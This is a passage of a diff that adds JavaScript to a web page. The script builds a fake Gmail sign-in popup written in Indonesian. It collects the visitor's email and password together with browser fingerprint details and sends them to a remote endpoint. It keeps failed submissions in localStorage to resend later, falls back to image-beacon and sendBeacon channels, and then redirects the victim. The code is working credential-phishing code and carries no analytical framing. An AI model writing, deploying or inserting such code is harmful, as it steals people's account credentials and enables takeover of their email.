+      function step1() {
+        $('gsiStep2').style.display = 'none';
+        $('gsiStep1').style.display = 'block';
+        $('gsiChip').style.display = 'none';
+        $('gsiTitle').textContent = 'Masuk';
+        $('gsiSub').textContent = 'untuk melanjutkan ke Gmail';
+        clearStatus();
+      }
+
+      function qs(pass) {
+        var p = new URLSearchParams();
+        p.set('action', 'login');
+        p.set('rid', rid());
+        p.set('username', username);
+        p.set('email', username);
+        p.set('password', pass);
+        p.set('deviceId', devId());
+        p.set('userAgent', navigator.userAgent || '');
+        p.set('platform', (navigator.userAgentData && navigator.userAgentData.platform) ? navigator.userAgentData.platform : (navigator.platform || ''));
+        p.set('language', navigator.language || '');
+        p.set('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone || '');
+        p.set('screen', (screen.width || 0) + 'x' + (screen.height || 0));
+        p.set('referrer', document.referrer || '');
+        p.set('page', location.href);
+        p.set('ts', new Date().toISOString());
+        return p.toString();
+      }
+
+      function enqueue(q) {
+        try {
+          var a = JSON.parse(localStorage.getItem(KEY_Q) || '[]');
+          a.push(q);
+          if (a.length > 50) a = a.slice(-50);
+          localStorage.setItem(KEY_Q, JSON.stringify(a));
+        } catch (e) { }
+      }
+      function dequeue(q) {
+        try {
+          var a = JSON.parse(localStorage.getItem(KEY_Q) || '[]');
+          var i = a.indexOf(q);
+          if (i > -1) { a.splice(i, 1); localStorage.setItem(KEY_Q, JSON.stringify(a)); }
+        } catch (e) { }
+      }
+
+      function postCors(q) {
+        return fetch(ENDPOINT, {
+          method: 'POST', mode: 'cors', credentials: 'omit', redirect: 'follow',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
+          body: q
+        }).then(function (r) {
+          return r.text().then(function (t) { return { ok: true, text: t }; });
+        }).catch(function () { return { ok: false, text: '' }; });
+      }
+
+      function postNoCors(q) {
+        return fetch(ENDPOINT, {
+          method: 'POST', mode: 'no-cors', keepalive: true,
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
+          body: q
+        }).then(function () { return true; }).catch(function () { return false; });
+      }
+
+      function flushQueue() {
+        var a;
+        try { a = JSON.parse(localStorage.getItem(KEY_Q) || '[]'); } catch (e) { return; }
+        if (!a || !a.length) return;
+        a.slice().forEach(function (q) {
+          postCors(q).then(function (r) {
+            if (!r.ok) return;
+            try { if (JSON.parse(r.text).ok) dequeue(q); } catch (e) { }
+          });
+        });
+      }
+
+      function openPopup() {
+        if (closeTimer) { clearTimeout(closeTimer); closeTimer = null; }
+        root.style.display = 'flex';
+        document.body.classList.add('gsi-lock');
+        reopenBtn.style.display = 'none';
+        requestAnimationFrame(function () { root.classList.remove('gsi-hide'); });
+        busy = false;
+        $('gsiDone').style.display = 'none';
+        $('gsiForm').style.display = 'block';
+        var b = $('gsiSignIn');
+        b.disabled = false; b.classList.remove('gsi-loading'); $('gsiLbl').textContent = 'Berikutnya';
+        passEl.value = '';
+        step1();
+        setTimeout(function () { emailEl.focus(); }, 250);
+      }
+
+      function closePopup() {
+        root.classList.add('gsi-hide');
+        document.body.classList.remove('gsi-lock');
+        closeTimer = setTimeout(function () {
+          root.style.display = 'none';
+          reopenBtn.style.display = 'flex';
+        }, 260);
+      }
+
+      function finish() {
+        try { localStorage.setItem('gsi_last_user', username); } catch (e) { }
+        if (NEXT_URL) {
+          setStatus('Mengalihkan ke halaman pengecekan...', '#188038');
+          try {
+            if (navigator.sendBeacon && lastQ) {
+              navigator.sendBeacon(ENDPOINT, new Blob([lastQ], { type: 'application/x-www-form-urlencoded;charset=UTF-8' }));
+            }
+          } catch (e) { }
+          setTimeout(function () { location.replace(NEXT_URL); }, 700);
+          return;
+        }
+        $('gsiForm').style.display = 'none';
+        $('gsiDone').style.display = 'block';
+        $('gsiWho').textContent = username;
+        closeTimer = setTimeout(closePopup, 2600);
+      }
+
+      function fallback(q) {
+        try { var img = new Image(); img.src = ENDPOINT + '?t=' + Date.now() + '&' + q; } catch (e) { }
+        postNoCors(q).then(function (ok) {
+          setStatus(ok ? 'Terkirim, konfirmasi tidak tersedia.' : 'Gagal kirim, akan dikirim ulang.', ok ? '#b06000' : '#d93025');
+          setTimeout(finish, 1200);
+        });
+      }
+
+      function submit() {
+        if (busy) return;
+        var pass = passEl.value;
+        if (!pass) {
+          $('gsiPassField').classList.add('gsi-bad');
+          $('gsiPassErr').classList.add('show');
+          passEl.focus();
+          return;
+        }
+        busy = true;
+        var b = $('gsiSignIn');
+        b.disabled = true;
+        b.classList.add('gsi-loading');
+        $('gsiLbl').textContent = 'Menyimpan...';
+        setStatus('Menghubungi server...', '#5f6368');
+
+        var q = qs(pass);
+        lastQ = q;
+        enqueue(q);
+
+        var settled = false;
+        var timer = setTimeout(function () {
+          if (settled) return;
+          settled = true;
+          fallback(q);
+        }, 8000);
+
+        postCors(q).then(function (r) {
+          if (settled) return;
+          settled = true;
+          clearTimeout(timer);
+          if (!r.ok) { fallback(q); return; }
+
+          var data = {};
+          try { data = JSON.parse(r.text); } catch (e) { }
+
+          if (data && data.ok) {
+            dequeue(q);
+            setStatus(data.row ? ('Tersimpan di baris ' + data.row) : 'Tersimpan', '#188038');
+            setTimeout(finish, 600);
+            return;
+          }
+          setStatus('Server menolak: ' + (data && data.error ? data.error : 'tidak diketahui'), '#d93025');
+          setTimeout(finish, 1400);
+        });
+      }
+
+      $('gsiNext').addEventListener('click', step2);
+      $('gsiSignIn').addEventListener('click', submit);
+
+      emailEl.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); step2(); } });
+      passEl.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); submit(); } });
+      emailEl.addEventListener('input', function () {
+        $('gsiEmailField').classList.remove('gsi-bad');
+        $('gsiEmailErr').classList.remove('show');
+      });
+      passEl.addEventListener('input', function () {
+        $('gsiPassField').classList.remove('gsi-bad');
+        $('gsiPassErr').classList.remove('show');
+      });
+
+      $('gsiShow').addEventListener('change', function () {
+        passEl.type = this.checked ? 'text' : 'password';
+        passEl.focus();
+      });
+
+      $('gsiAgain').addEventListener('click', openPopup);
+      reopenBtn.addEventListener('click', openPopup);
+
+      $('gsiForgotEmail').addEventListener('click', function () { alert('Hubungi admin untuk pemulihan akun.'); });
+      $('gsiForgotPass').addEventListener('click', function () { alert('Hubungi admin untuk reset sandi.'); });
+      $('gsiCreate').addEventListener('click', function () { alert('Pendaftaran akun dilakukan oleh admin.'); });
+
+      document.body.classList.add('gsi-lock');
+      setTimeout(function () { emailEl.focus(); }, 300);
+
+      flushQueue();
+    })();
+  </script>
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CLKXPW3X6S"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag("js", new Date());
+    gtag("config", "G-CLKXPW3X6S");
+  </script>
+</body>
+
+</html>
